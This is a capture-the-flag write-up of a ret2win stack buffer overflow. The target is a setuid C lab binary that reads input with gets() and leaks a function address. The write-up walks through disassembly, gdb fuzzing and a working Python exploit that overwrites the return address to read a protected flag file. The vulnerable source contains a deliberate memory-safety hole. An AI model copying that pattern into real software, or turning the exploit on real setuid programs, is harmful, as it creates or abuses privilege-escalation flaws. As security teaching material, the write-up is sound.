# Parcham Pwn second challenge

After logging into the server we see there are two files inside user1 directory\
Also there is a flag file inside flag user directory but we can't read that because we don't have permissions for that\
If we check the files permissions we can see that the code binary's owner is flag user and its suid bit is enabled\
So if we run it (it's world executable because of permissions) we are actually running it as flag user

```
user1@parcham-os-2:~$ ls -l
total 24
-r-sr-xr-x 1 flag  flag  17024 Feb 10 00:13 code
-r--r--r-- 1 user1 user1   435 Feb 10 00:13 code.c

```

Let's see code.c source code

```
user1@parcham-os-2:~$ cat code.c 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
 
void notCallMe() {
    char *envp[] = { NULL };
    char *argv[] = {"/bin/cat", "/home/flag/flag.txt", NULL};
    execve("/bin/cat", argv, envp);
}

void callMe() {
    char buffer[64];
    printf("%p\n", *notCallMe);
    fflush(stdout);
    gets(buffer);
}
 
int main(int argc, char** argv) {
    callMe();
 
    printf("Exiting...\n");
    exit(0);
}

```


There are two functions\
callMe which declares a buffter and write our input inside it\
notCallMe which reads content of flag file (it's possible because of suid bit enabled and we run it on behalf of flag user)\
But the problem is that notCallMe function is not called inside the compiled binary

If we take a look at callMe function we see there is a simple buffer overflow vulnerability because of using "gets" function\
So if overflow the buffer variable with our input and overwrite the return address of the stack of callMe function, we can change the flow of the program to point to notCallMe function and get the flag



We download the files so we can use debugger 
```
$ scp -P 8025 user1@86.104.33.87:/home/user1/code* .
user1@86.104.33.87's password: 
code                                                                          100%   17KB 377.6KB/s   00:00    
code.c                                                                        100%  435    64.7KB/s   00:00    

```

If we disassmble the file we see it's a 64 bit linux binary
So for addressing, soring and using variables we need our variable to be mutiple of word size (8 bytes or 64 bits)

```
$ objdump -D code | less

0000000000001235 <callMe>:
    1235:       f3 0f 1e fa             endbr64 
    1239:       55                      push   %rbp
    123a:       48 89 e5                mov    %rsp,%rbp
    123d:       48 83 ec 40             sub    $0x40,%rsp
    1241:       48 8d 35 a1 ff ff ff    lea    -0x5f(%rip),%rsi        # 11e9 <notCallMe>
    1248:       48 8d 3d d2 0d 00 00    lea    0xdd2(%rip),%rdi        # 2021 <_IO_stdin_used+0x21>
    124f:       b8 00 00 00 00          mov    $0x0,%eax
    1254:       e8 57 fe ff ff          callq  10b0 <printf@plt>
    1259:       48 8b 05 b0 2d 00 00    mov    0x2db0(%rip),%rax        # 4010 <stdout@@GLIBC_2.2.5>
    1260:       48 89 c7                mov    %rax,%rdi
    1263:       e8 78 fe ff ff          callq  10e0 <fflush@plt>
    1268:       48 8d 45 c0             lea    -0x40(%rbp),%rax
    126c:       48 89 c7                mov    %rax,%rdi
    126f:       b8 00 00 00 00          mov    $0x0,%eax
    1274:       e8 57 fe ff ff          callq  10d0 <gets@plt>
    1279:       90                      nop
    127a:       c9                      leaveq 
    127b:       c3                      retq   

```

So our stack will looks like this
```
bottom of                                             top of
memory                                                memory
              buffer       SFP     RET  
<------   [ 64 * bytes ][8 bytes][    ]
	   
top of                                              bottom of
stack                                                 stack
```


1) First The return address (RET) is pushed into stack
2) Second the Base pointer or (Stack Frame Pointer SPF) is pushed into stack and because our word size is 8 bytes it will took 8 bytes in the stack
3) Third the stack pointer (%rsp) is subtracted by 0x40 (64 in decimal) which is the size of our buffer

So after calling the stack we are 72 bytes away from return address\
If we start fuzzing the binary with input size of 72 bytes we will get segmentation fault because of smashing the stack

```
python3 -c "print('A'*72)" > payload
$ gdb code

gdb-peda$ r < payload 
Starting program: /home/kourosh/CTF/parcham/Pwn/SecondChallenge/code < payload
0x55b5f75481e9

Program received signal SIGBUS, Bus error.
[----------------------------------registers-----------------------------------]
RAX: 0x7fff32f83970 --> 0x41414141414141b1 
RBX: 0x55b5f75482b0 (<__libc_csu_init>: endbr64)
RCX: 0x7f455f991980 --> 0xfbad2088 
RDX: 0x0 
RSI: 0x55b5f84e46b1 --> 0x41414141414141c1 
RDI: 0x7f455f9944d0 --> 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fff32f839c0 --> 0x7fff32f83ac8 --> 0x7fff32f84de9 ("/home/kourosh/CTF/parcham/Pwn/SecondChallenge/code")
RIP: 0x55b5f7548204 (<notCallMe+27>:    mov    QWORD PTR [rbp-0x20],rax)
R8 : 0x7fff32f83970 --> 0x41414141414141b1 
R9 : 0x0 
R10: 0x55b5f7549023 --> 0x6e6974697845000a ('\n')
R11: 0x246 
R12: 0x55b5f7548100 (<_start>:  endbr64)
R13: 0x7fff32f83ac0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10a86 (carry PARITY adjust zero SIGN trap INTERRUPT direction OVERFLOW)

gdb-peda$ info frame
Stack level 0, frame at 0x4141414141414151:
 rip = 0x55b5f7548204 in notCallMe; saved rip = <not saved>
 Outermost frame: Cannot access memory at address 0x4141414141414149
 Arglist at 0x7fff32f839b8, args: 
 Locals at 0x7fff32f839b8, Previous frame's sp is 0x4141414141414151
Cannot access memory at address 0x4141414141414141

```

we see that the return address is changed to 0x4141414141414141 which is the 'A' characters we entered and they overflowed the buffer and changed the return address\
So we should change the address of return address to point to the notCallMe function\
The address of function is printed before doing anything but it's not constant\
If it was constant we could craft our payload with this command and execute the program with it

```
$ python3 -c "print('A'*72+<inverse hexadecimal address>)" | ./code
```


For example if our address is like this **0xdeadbeef**\
We should write the payload like this
```
python3 -c "print('A'*72+'\xef\xbe\xad\xde')" | ./code
```
We inverted the address because we are using stack


We have a problem here, our address is not constant so we can't craft our payload before running the program\
We should craft the payload in runtime after printing the notCallMe funcion address

One of the ways is using pwntools in python but we don't have pwntools installed on the remote server so this on fails\
Second way is to use pwntools through ssh on the remote server but pwntools is looking for python binary which does not exist on the server and there is only python3 so this one failed too\
The thrid way which I used was to study pwntools to understand what exactly is being done and reimplement it in python

I used python subprocess

1) we execute the binary with subprocess
2) Grab the notCallMe address after printing
3) revert the address in format which we can use in our payload
4) craft the main payload and write it in stdin of the program

```
import subprocess
PIPE = subprocess.PIPE

def exploit():

    proc = subprocess.Popen(['/home/user1/code'],stdout=PIPE, stdin=PIPE, stderr=PIPE)
    
    line = proc.stdout.readline()
        
    print(line.rstrip())
    address = line.rstrip().decode()
    address_size = len(address)

    payload = b'A' * 72
    new_address = b''

    for i in range(address_size, 2, -2):
        new_address += bytes.fromhex(address[i-2:i])
    payload += new_address

    print(payload)

    stdout_data = proc.communicate(input=payload)[0]
    print(stdout_data)

exploit()

```

After executing the above exploit the return address is changed and notCallMe function is called and we got the flag
```
user1@parcham-os-2:/dev/shm$ python3 ./.e.py
b'0x55aa556ba1e9'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe9\xa1kU\xaaU'
b'parcham{5654794b7e0e5b4a75e07fa7b515b295}\n'
```

First line is the address printed by the program (b'0x55aa556ba1e9')\
Second line is tha payload (b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe9\xa1kU\xaaU')\
Third line is the flag **(b'parcham{5654794b7e0e5b4a75e07fa7b515b295}\n')**

Finish
By KRypton.
